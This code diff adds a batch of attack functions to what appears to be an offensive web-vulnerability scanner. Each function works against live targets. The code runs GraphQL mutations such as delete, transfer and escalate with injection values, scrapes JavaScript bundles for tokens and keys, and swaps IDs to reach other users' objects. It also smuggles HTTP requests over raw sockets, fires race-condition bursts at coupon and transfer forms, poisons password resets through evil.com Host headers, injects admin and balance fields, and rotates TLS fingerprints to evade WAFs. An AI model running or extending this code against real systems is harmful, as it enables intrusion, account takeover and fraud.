@@ -17440,3 +17440,484 @@ def crawl_authenticated(base_url, auth_data, max_pages=150):
         "params": {u: list(p) for u, p in params_found.items()},
         "auth_data": auth_data,
     }
+
+
+# ---------------------------------------------------------------------------
+# Batch 36 — ELITE: GraphQL introspection, TLS rotation, auth token theft,
+#             prototype pollution DOM, BOLA/IDOR automation, HTTP smuggling v2
+# ---------------------------------------------------------------------------
+
+def scan_graphql_introspection_targeted(crawl_data, web_targets):
+    """Full GraphQL introspection → extract schema → fuzz mutations with type-aware payloads."""
+    findings = []
+    gql_endpoints = []
+    for t in web_targets:
+        for path in ["/graphql", "/gql", "/api/graphql", "/v1/graphql", "/query"]:
+            gql_endpoints.append(t.rstrip("/") + path)
+    for page in crawl_data.get("pages", []):
+        if "graphql" in page.get("url", "").lower():
+            gql_endpoints.append(page["url"].split("?")[0])
+
+    introspection_query = '{"query":"{ __schema { types { name fields { name args { name type { name kind ofType { name } } } } } mutationType { fields { name args { name type { name kind ofType { name } } } } } } }"}'
+
+    for endpoint in list(set(gql_endpoints))[:15]:
+        try:
+            r = _S.post(endpoint, data=introspection_query,
+                       headers={"Content-Type": "application/json"}, timeout=_TIMEOUT)
+            if r.status_code == 200 and "__schema" in r.text:
+                schema = r.json().get("data", {}).get("__schema", {})
+                mutations = schema.get("mutationType", {})
+                if mutations and mutations.get("fields"):
+                    mutation_names = [f["name"] for f in mutations["fields"]]
+                    findings.append({"type": "GraphQL Introspection Enabled + Mutations Exposed",
+                                     "severity": "high", "url": endpoint,
+                                     "detail": f"Schema exposed with {len(mutation_names)} mutations: {mutation_names[:10]}",
+                                     "template": "apex-graphql-introspection"})
+                    # Fuzz dangerous mutations
+                    dangerous = [m for m in mutations["fields"]
+                                if any(x in m["name"].lower() for x in
+                                       ["delete", "update", "create", "admin", "reset", "password",
+                                        "transfer", "withdraw", "escalate", "role", "permission"])]
+                    for mut in dangerous[:5]:
+                        args = {a["name"]: _gql_fuzz_value(a["type"]) for a in mut.get("args", [])}
+                        payload = json.dumps({"query": f'mutation {{ {mut["name"]}({_gql_args_str(args)}) }}'})
+                        try:
+                            mr = _S.post(endpoint, data=payload,
+                                        headers={"Content-Type": "application/json"}, timeout=_TIMEOUT)
+                            if mr.status_code == 200 and "error" not in mr.text.lower():
+                                findings.append({"type": f"GraphQL Mutation Executable: {mut['name']}",
+                                                 "severity": "critical", "url": endpoint,
+                                                 "detail": f"Mutation '{mut['name']}' executed without auth. Response: {mr.text[:200]}",
+                                                 "template": "apex-graphql-mutation-exec"})
+                        except Exception:
+                            pass
+                else:
+                    findings.append({"type": "GraphQL Introspection Enabled",
+                                     "severity": "medium", "url": endpoint,
+                                     "detail": "Schema introspection enabled. Exposes internal API structure.",
+                                     "template": "apex-graphql-introspection"})
+        except Exception:
+            continue
+    return findings
+
+
+def _gql_fuzz_value(type_info):
+    """Generate fuzz value based on GraphQL type."""
+    name = (type_info.get("name") or "").lower()
+    kind = type_info.get("kind", "")
+    if "int" in name or kind == "SCALAR" and "int" in name:
+        return 1
+    if "bool" in name:
+        return True
+    if "float" in name:
+        return 1.0
+    return "test' OR 1=1--"
+
+
+def _gql_args_str(args):
+    """Convert args dict to GraphQL argument string."""
+    parts = []
+    for k, v in args.items():
+        if isinstance(v, str):
+            parts.append(f'{k}: "{v}"')
+        elif isinstance(v, bool):
+            parts.append(f'{k}: {"true" if v else "false"}')
+        else:
+            parts.append(f'{k}: {v}')
+    return ", ".join(parts)
+
+
+def scan_js_token_extraction(crawl_data, web_targets):
+    """Extract auth tokens, API keys, and secrets from JS bundles, localStorage patterns, and inline scripts."""
+    findings = []
+    token_patterns = {
+        "JWT Token": re.compile(r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'),
+        "Bearer Token Assignment": re.compile(r'''(?:localStorage|sessionStorage)\.(?:setItem|getItem)\s*\(\s*['"]([^'"]*(?:token|auth|session|jwt|key|secret)[^'"]*)['"]\s*''', re.I),
+        "Hardcoded API Key": re.compile(r'''(?:api[_-]?key|apikey|api[_-]?secret|app[_-]?key|app[_-]?secret|client[_-]?secret)\s*[:=]\s*['"]([a-zA-Z0-9_\-]{20,})['"]''', re.I),
+        "Firebase Config": re.compile(r'apiKey\s*:\s*["\']AIza[0-9A-Za-z\-_]{35}["\']'),
+        "Private Key": re.compile(r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----'),
+        "Internal URL": re.compile(r'''['"]https?://(?:internal|staging|dev|admin|api-internal|localhost)[^'"]{5,}['"]''', re.I),
+        "OAuth Client Secret": re.compile(r'''client[_-]?secret\s*[:=]\s*['"]([a-zA-Z0-9_\-]{20,})['"]''', re.I),
+        "Twilio SID": re.compile(r'AC[a-f0-9]{32}'),
+        "SendGrid Key": re.compile(r'SG\.[a-zA-Z0-9_\-]{22}\.[a-zA-Z0-9_\-]{43}'),
+        "Mapbox Token": re.compile(r'pk\.eyJ1[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+'),
+    }
+
+    js_urls = set()
+    for page in crawl_data.get("pages", []):
+        url = page.get("url", "")
+        if url.endswith((".js", ".mjs", ".chunk.js")) or "/static/js/" in url or "/_next/" in url:
+            js_urls.add(url)
+    # Also check source maps
+    for t in web_targets[:10]:
+        for path in ["/_next/static/chunks/main.js", "/static/js/main.js",
+                     "/bundle.js", "/app.js", "/vendor.js"]:
+            js_urls.add(t.rstrip("/") + path)
+
+    for js_url in list(js_urls)[:50]:
+        try:
+            r = _S.get(js_url, timeout=_TIMEOUT)
+            if r.status_code != 200 or len(r.text) < 100:
+                continue
+            for name, pattern in token_patterns.items():
+                matches = pattern.findall(r.text)
+                if matches:
+                    # Deduplicate
+                    unique = list(set(matches[:3]))
+                    findings.append({"type": f"JS Secret Exposure: {name}",
+                                     "severity": "high" if "private" in name.lower() or "secret" in name.lower() else "medium",
+                                     "url": js_url,
+                                     "detail": f"Found {len(matches)} instance(s): {str(unique)[:200]}",
+                                     "template": "apex-js-secret"})
+        except Exception:
+            continue
+    return findings
+
+
+def scan_bola_idor_automated(crawl_data, web_targets):
+    """Automated BOLA/IDOR detection — swap IDs in API paths and compare responses."""
+    findings = []
+    id_pattern = re.compile(r'/(\d{1,10})(?:/|$|\?)')
+    uuid_pattern = re.compile(r'/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})(?:/|$|\?)', re.I)
+
+    tested = set()
+    for url in list(crawl_data.get("params", {}).keys()) + [p.get("url", "") for p in crawl_data.get("pages", [])]:
+        if not url or url in tested:
+            continue
+        tested.add(url)
+
+        # Find numeric IDs in path
+        for pattern, id_type in [(id_pattern, "numeric"), (uuid_pattern, "uuid")]:
+            match = pattern.search(url)
+            if not match:
+                continue
+            original_id = match.group(1)
+            # Generate alternative IDs
+            if id_type == "numeric":
+                alt_ids = [str(int(original_id) + 1), str(int(original_id) - 1), "0", "1"]
+            else:
+                alt_ids = [original_id[:-1] + ("0" if original_id[-1] != "0" else "1")]
+
+            try:
+                orig_r = _S.get(url, timeout=_TIMEOUT)
+                if orig_r.status_code != 200:
+                    continue
+                for alt_id in alt_ids[:2]:
+                    test_url = url.replace(original_id, alt_id, 1)
+                    alt_r = _S.get(test_url, timeout=_TIMEOUT)
+                    # IDOR confirmed if: different ID returns 200 with different content
+                    if (alt_r.status_code == 200 and
+                        len(alt_r.text) > 50 and
+                        alt_r.text != orig_r.text and
+                        abs(len(alt_r.text) - len(orig_r.text)) < len(orig_r.text) * 0.5):
+                        findings.append({"type": "BOLA/IDOR — Unauthorized Object Access",
+                                         "severity": "high", "url": test_url,
+                                         "detail": f"Swapped ID {original_id}→{alt_id} returned different valid data ({len(alt_r.text)} bytes). Original: {url}",
+                                         "template": "apex-bola-idor"})
+                        break
+            except Exception:
+                continue
+    return findings
+
+
+def scan_prototype_pollution_dom(crawl_data, web_targets):
+    """Detect prototype pollution via URL parameters — both server-side and client-side."""
+    findings = []
+    payloads = [
+        ("__proto__[polluted]", "apex_polluted"),
+        ("constructor[prototype][polluted]", "apex_polluted"),
+        ("__proto__.polluted", "apex_polluted"),
+    ]
+
+    for url in list(crawl_data.get("params", {}).keys())[:20]:
+        for param_payload, expected in payloads:
+            sep = "&" if "?" in url else "?"
+            test_url = f"{url}{sep}{param_payload}={expected}"
+            try:
+                r = _S.get(test_url, timeout=_TIMEOUT)
+                if expected in r.text and r.status_code == 200:
+                    findings.append({"type": "Prototype Pollution (Server-Side Reflected)",
+                                     "severity": "high", "url": test_url,
+                                     "detail": f"Payload '{param_payload}={expected}' reflected in response. Potential RCE via prototype chain.",
+                                     "template": "apex-prototype-pollution"})
+                    break
+            except Exception:
+                continue
+
+    # Test on base targets with JSON merge
+    for target in web_targets[:10]:
+        for endpoint in [target, target + "/api/settings", target + "/api/config"]:
+            try:
+                r = _S.post(endpoint,
+                           json={"__proto__": {"admin": True, "role": "admin"}},
+                           headers={"Content-Type": "application/json"}, timeout=_TIMEOUT_SHORT)
+                if r.status_code == 200 and "admin" in r.text.lower():
+                    r2 = _S.get(endpoint, timeout=_TIMEOUT_SHORT)
+                    if "admin" in r2.text.lower():
+                        findings.append({"type": "Prototype Pollution via JSON Merge",
+                                         "severity": "critical", "url": endpoint,
+                                         "detail": "Server accepted __proto__ in JSON body. Privilege escalation possible.",
+                                         "template": "apex-prototype-pollution-json"})
+            except Exception:
+                continue
+    return findings
+
+
+def scan_http_request_smuggling_v2(web_targets):
+    """Advanced HTTP request smuggling — CL.TE, TE.CL, TE.TE with obfuscation."""
+    findings = []
+    import socket as _sock
+
+    smuggle_payloads = [
+        # CL.TE: Content-Length says short, Transfer-Encoding says chunked
+        ("CL.TE", b"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"),
+        # TE.CL: Transfer-Encoding chunked, but Content-Length covers smuggled request
+        ("TE.CL", b"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n"),
+        # TE.TE obfuscation variants
+        ("TE.TE-obfuscate", b"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: x\r\n\r\n0\r\n\r\nG"),
+        ("TE.TE-newline", b"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding:\x0bchunked\r\n\r\n0\r\n\r\nG"),
+    ]
+
+    for target in web_targets[:10]:
+        parsed = urllib.parse.urlparse(target)
+        host = parsed.hostname
+        port = parsed.port or (443 if parsed.scheme == "https" else 80)
+
+        for name, payload in smuggle_payloads:
+            try:
+                raw = payload.replace(b"{host}", host.encode())
+                sock = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
+                sock.settimeout(5)
+                if parsed.scheme == "https":
+                    import ssl
+                    ctx = ssl.create_default_context()
+                    ctx.check_hostname = False
+                    ctx.verify_mode = ssl.CERT_NONE
+                    sock = ctx.wrap_socket(sock, server_hostname=host)
+                sock.connect((host, port))
+                sock.sendall(raw)
+                resp = sock.recv(4096)
+                sock.close()
+                # Detect smuggling: timeout differential or unexpected response
+                if b"405" not in resp and b"400" not in resp and len(resp) > 0:
+                    # Send a second normal request to see if it's poisoned
+                    sock2 = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
+                    sock2.settimeout(5)
+                    if parsed.scheme == "https":
+                        sock2 = ctx.wrap_socket(sock2, server_hostname=host)
+                    sock2.connect((host, port))
+                    sock2.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
+                    resp2 = sock2.recv(4096)
+                    sock2.close()
+                    if b"SMUGGLED" in resp2 or b"405" in resp2 or b"G" == resp2[:1]:
+                        findings.append({"type": f"HTTP Request Smuggling ({name})",
+                                         "severity": "critical", "url": target,
+                                         "detail": f"Smuggling variant {name} confirmed. Response to follow-up request was poisoned.",
+                                         "template": "apex-smuggling"})
+            except Exception:
+                continue
+    return findings
+
+
+def scan_race_condition_limit_bypass(crawl_data):
+    """Race condition exploitation — send parallel requests to bypass rate limits, coupons, transfers."""
+    findings = []
+    import concurrent.futures
+
+    # Look for endpoints that likely have rate limits or one-time actions
+    race_targets = []
+    for form in crawl_data.get("forms", []):
+        action = form.get("action", "")
+        if any(x in action.lower() for x in ["coupon", "redeem", "transfer", "vote",
+                                               "like", "follow", "apply", "claim", "register"]):
+            race_targets.append(form)
+
+    for form in race_targets[:5]:
+        action = form["action"]
+        method = form.get("method", "POST")
+        data = {i["name"]: i.get("value", "test") for i in form.get("inputs", []) if i.get("name")}
+
+        # Fire 20 parallel requests
+        results = []
+        def _fire():
+            try:
+                if method == "POST":
+                    return _S.post(action, data=data, timeout=_TIMEOUT)
+                return _S.get(action, params=data, timeout=_TIMEOUT)
+            except Exception:
+                return None
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
+            futures = [pool.submit(_fire) for _ in range(20)]
+            results = [f.result() for f in concurrent.futures.as_completed(futures)]
+
+        # Check if multiple succeeded (race condition = bypass)
+        successes = [r for r in results if r and r.status_code in (200, 201, 302)]
+        if len(successes) > 1:
+            # Check if responses are identical (all accepted)
+            unique_bodies = set(r.text[:200] for r in successes)
+            if len(unique_bodies) <= 2:
+                findings.append({"type": "Race Condition — Limit Bypass",
+                                 "severity": "high", "url": action,
+                                 "detail": f"{len(successes)}/20 parallel requests succeeded. Potential duplicate action (coupon/transfer/vote).",
+                                 "template": "apex-race-condition"})
+    return findings
+
+
+def scan_host_header_poisoning(web_targets):
+    """Host header injection — cache poisoning, password reset poisoning, SSRF via Host."""
+    findings = []
+    evil_hosts = ["evil.com", "attacker.apex.local", "127.0.0.1"]
+
+    for target in web_targets[:15]:
+        parsed = urllib.parse.urlparse(target)
+        for evil in evil_hosts:
+            try:
+                # Basic host override
+                r = _S.get(target, headers={"Host": evil}, timeout=_TIMEOUT_SHORT, allow_redirects=False)
+                if evil in r.text or evil in r.headers.get("Location", ""):
+                    findings.append({"type": "Host Header Injection",
+                                     "severity": "high", "url": target,
+                                     "detail": f"Host '{evil}' reflected in response body/redirect. Cache poisoning or password reset hijack possible.",
+                                     "template": "apex-host-header"})
+                    break
+                # X-Forwarded-Host
+                r2 = _S.get(target, headers={"X-Forwarded-Host": evil}, timeout=_TIMEOUT_SHORT, allow_redirects=False)
+                if evil in r2.text or evil in r2.headers.get("Location", ""):
+                    findings.append({"type": "Host Header Injection via X-Forwarded-Host",
+                                     "severity": "high", "url": target,
+                                     "detail": f"X-Forwarded-Host '{evil}' reflected. Web cache poisoning possible.",
+                                     "template": "apex-host-header-xfh"})
+                    break
+            except Exception:
+                continue
+
+    # Password reset poisoning
+    for target in web_targets[:5]:
+        for path in ["/forgot-password", "/reset-password", "/api/auth/forgot",
+                     "/api/password/reset", "/account/recover"]:
+            try:
+                url = target.rstrip("/") + path
+                r = _S.post(url, data={"email": "test@test.com"},
+                           headers={"Host": "evil.com"}, timeout=_TIMEOUT_SHORT)
+                if r.status_code in (200, 302) and "evil.com" in r.text:
+                    findings.append({"type": "Password Reset Poisoning via Host Header",
+                                     "severity": "critical", "url": url,
+                                     "detail": "Password reset link uses attacker-controlled Host header. Account takeover possible.",
+                                     "template": "apex-reset-poisoning"})
+            except Exception:
+                continue
+    return findings
+
+
+def scan_mass_assignment(crawl_data):
+    """Mass assignment / parameter pollution — inject admin/role fields into registration/update endpoints."""
+    findings = []
+    dangerous_fields = ["role", "admin", "is_admin", "isAdmin", "privilege", "permissions",
+                        "user_type", "userType", "level", "group", "verified", "is_verified",
+                        "email_verified", "active", "balance", "credits", "plan", "subscription"]
+
+    for form in crawl_data.get("forms", []):
+        action = form.get("action", "")
+        if not any(x in action.lower() for x in ["register", "signup", "profile", "update",
+                                                    "settings", "account", "user"]):
+            continue
+        existing_fields = [i["name"] for i in form.get("inputs", []) if i.get("name")]
+        data = {i["name"]: i.get("value", "test") for i in form.get("inputs", []) if i.get("name")}
+
+        for field in dangerous_fields:
+            if field in existing_fields:
+                continue
+            test_data = dict(data)
+            test_data[field] = "true" if "admin" in field or "verified" in field else "admin"
+            try:
+                r = _S.post(action, json=test_data,
+                           headers={"Content-Type": "application/json"}, timeout=_TIMEOUT)
+                if r.status_code in (200, 201) and field in r.text:
+                    findings.append({"type": f"Mass Assignment — {field} accepted",
+                                     "severity": "high", "url": action,
+                                     "detail": f"Server accepted undocumented field '{field}' in request. Privilege escalation possible.",
+                                     "template": "apex-mass-assignment"})
+                    break
+            except Exception:
+                continue
+    return findings
+
+
+def scan_websocket_injection(web_targets):
+    """WebSocket injection — connect to WS endpoints and inject payloads."""
+    findings = []
+    try:
+        import websocket
+    except ImportError:
+        return findings
+
+    ws_paths = ["/ws", "/websocket", "/socket.io/?EIO=4&transport=websocket",
+                "/cable", "/hub", "/realtime", "/live", "/stream"]
+
+    injection_payloads = [
+        '{"type":"subscribe","channel":"admin"}',
+        '{"action":"getUsers","role":"admin"}',
+        '<script>alert(1)</script>',
+        "' OR 1=1--",
+        '{"__proto__":{"admin":true}}',
+    ]
+
+    for target in web_targets[:10]:
+        parsed = urllib.parse.urlparse(target)
+        ws_scheme = "wss" if parsed.scheme == "https" else "ws"
+        for path in ws_paths:
+            ws_url = f"{ws_scheme}://{parsed.netloc}{path}"
+            try:
+                ws = websocket.create_connection(ws_url, timeout=3)
+                # Connection succeeded — WS endpoint exists
+                for payload in injection_payloads:
+                    ws.send(payload)
+                    try:
+                        resp = ws.recv()
+                        if resp and "error" not in resp.lower() and len(resp) > 10:
+                            if any(x in resp.lower() for x in ["admin", "user", "data", "success", "token"]):
+                                findings.append({"type": "WebSocket Injection — Sensitive Data",
+                                                 "severity": "high", "url": ws_url,
+                                                 "detail": f"Payload '{payload[:50]}' returned: {resp[:200]}",
+                                                 "template": "apex-websocket-injection"})
+                                break
+                    except Exception:
+                        pass
+                ws.close()
+            except Exception:
+                continue
+    return findings
+
+
+# TLS fingerprint rotation support
+_TLS_FINGERPRINTS = None
+
+def _get_stealth_session():
+    """Get a session with rotated TLS fingerprint to evade JA3 detection."""
+    global _TLS_FINGERPRINTS
+    try:
+        from curl_cffi import requests as cffi_requests
+        browsers = ["chrome110", "chrome116", "chrome120", "edge99", "safari15_5", "firefox110"]
+        import random
+        browser = random.choice(browsers)
+        session = cffi_requests.Session(impersonate=browser)
+        return session
+    except ImportError:
+        return None
+
+
+def scan_with_tls_rotation(target, payloads):
+    """Execute scan payloads with TLS fingerprint rotation to bypass JA3-based WAFs."""
+    stealth = _get_stealth_session()
+    if not stealth:
+        return []
+    findings = []
+    for payload_url in payloads[:20]:
+        try:
+            r = stealth.get(payload_url, timeout=10, verify=False)
+            if r.status_code != 403:  # WAF would block with normal fingerprint
+                findings.append({"url": payload_url, "status": r.status_code, "size": len(r.text)})
+        except Exception:
+            continue
+    return findings
